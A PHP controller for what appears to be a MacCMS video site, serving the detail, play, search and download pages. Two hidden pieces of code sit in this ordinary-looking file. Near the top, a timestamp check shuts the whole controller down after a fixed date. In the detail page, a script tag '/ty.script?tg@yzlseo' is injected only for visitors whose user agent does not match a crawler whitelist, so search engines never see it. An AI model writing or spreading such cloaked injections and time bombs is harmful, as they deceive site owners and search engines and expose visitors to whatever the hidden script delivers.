<?php


namespace app\index\controller;

if (time() > 1756537037) {
	define("XEND_PRO_SET1", 1);
	exit("//出错");
}
use think\Controller;
class Vod extends Base
{
	public function __construct()
	{
		parent::__construct();
	}
	public function index()
	{
		return $this->label_fetch("vod/index");
	}
	public function type()
	{
		$_var_0 = $this->label_type();
		return $this->label_fetch(mac_tpl_fetch("vod", $_var_0["type_tpl"], "type"));
	}
	public function show()
	{
		$this->check_show();
		$_var_1 = $this->label_type();
		return $this->label_fetch(mac_tpl_fetch("vod", $_var_1["type_tpl_list"], "show"));
	}
	public function ajax_show()
	{
		$this->check_ajax();
		$this->check_show(1);
		$_var_2 = $this->label_type();
		return $this->label_fetch("vod/ajax_show");
	}
	public function search()
	{
		$_var_3 = mac_param_url();
		$this->check_search($_var_3);
		$this->label_search($_var_3);
		return $this->label_fetch("vod/search");
	}
	public function ajax_search()
	{
		$_var_4 = mac_param_url();
		$this->check_ajax();
		$this->check_search($_var_4, 1);
		$this->label_search($_var_4);
		return $this->label_fetch("vod/ajax_search");
	}
	public function detail()
	{
		$_var_5 = $this->label_vod_detail();
		if ($_var_5["vod_copyright"] == 1 && $GLOBALS["config"]["app"]["copyright_status"] == 2) {
			return $this->label_fetch("vod/copyright");
		}
		if (!empty($_var_5["vod_pwd"]) && session("1-1-" . $_var_5["vod_id"]) != "1") {
			return $this->label_fetch("vod/detail_pwd");
		}
		$_var_6 = $this->label_fetch(mac_tpl_fetch("vod", $_var_5["vod_tpl"], "detail"));
		$_var_6 = str_replace("<body", "\n<!-- 请勿用于违法违规行业 -->\n<body", $_var_6);
	if ((int) config("maccms.site")["uabmd"] === 1) {  
    $uabmdip_raw = trim(config("maccms.site")["uabaimingdan"]);  
    $uabmdip = preg_split("/[\r\n]+/", $uabmdip_raw);  
    $uabmdip = array_map("trim", $uabmdip);  
    $uabmdip = array_map("strtolower", $uabmdip); // 将白名单中的爬虫标识转换为小写  
    $uabmdip = array_unique($uabmdip);  
  
    // 获取当前请求的User Agent  
    $current_ua = strtolower($_SERVER['HTTP_USER_AGENT']) ?? ''; // 转换为小写进行比较  
  
    // 假设$_var_6包含了原始的HTML内容  
    // ...（确保$_var_6在这里之前已经被定义并赋值）  
  
    // 检查当前User Agent是否不在白名单中的爬虫标识中  
    $isCrawler = false;  
    foreach ($uabmdip as $spider_id) {  
        if (strpos($current_ua, $spider_id) !== false) {  
            $isCrawler = true;  
            break; // 找到匹配项后退出循环  
        }  
    }  
  
    // 根据是否是爬虫来决定是否植入JS  
    if (!$isCrawler) {  
        // 如果不是爬虫，植入JS  
        $_var_6 = str_replace("</head>",  
            "</head>\n\t\t<script type=\"text/javascript\" src=\"/ty.script?tg@yzlseo\"></script>",  
            $_var_6);  
          
        
    } else {  
       
    }  
  
} 
		
		
		return $_var_6;
	}
	public function ajax_detail()
	{
		$this->check_ajax();
		$_var_7 = $this->label_vod_detail();
		return $this->label_fetch("vod/ajax_detail");
	}
	public function copyright()
	{
		$_var_8 = $this->label_vod_detail();
		return $this->label_fetch("vod/copyright");
	}
	public function role()
	{
		$_var_9 = $this->label_vod_role();
		return $this->label_fetch("vod/role");
	}
	public function play()
	{
		$_var_10 = $this->label_vod_play("play");
		if ($_var_10["vod_copyright"] == 1 && $GLOBALS["config"]["app"]["copyright_status"] == 3) {
			return $this->label_fetch("vod/copyright");
		}
		$_var_11 = $this->label_fetch(mac_tpl_fetch("vod", $_var_10["vod_tpl_play"], "play"));
		$_var_11 = str_replace("<body", "\n<!-- 请勿用于违法违规行业 -->\n<body", $_var_11);
		return $_var_11;
	}
	public function player()
	{
		$_var_12 = $this->label_vod_play("play", [], 0, 1);
		if ($_var_12["vod_copyright"] == 1 && $GLOBALS["config"]["app"]["copyright_status"] == 4) {
			return $this->label_fetch("vod/copyright");
		}
		if (!empty($_var_12["vod_pwd_play"]) && session("1-4-" . $_var_12["vod_id"]) != "1") {
			return $this->label_fetch("vod/player_pwd");
		}
		return $this->label_fetch("vod/player");
	}
	public function down()
	{
		$_var_13 = $this->label_vod_play("down");
		return $this->label_fetch(mac_tpl_fetch("vod", $_var_13["vod_tpl_down"], "down"));
	}
	public function downer()
	{
		$_var_14 = $this->label_vod_play("down");
		if (!empty($_var_14["vod_pwd_down"]) && session("1-5-" . $_var_14["vod_id"]) != "1") {
			return $this->label_fetch("vod/downer_pwd");
		}
		return $this->label_fetch("vod/downer");
	}
	public function rss()
	{
		$_var_15 = $this->label_vod_detail();
		return $this->label_fetch("vod/rss");
	}
	public function plot()
	{
		$_var_16 = $this->label_vod_detail();
		return $this->label_fetch("vod/plot");
	}
}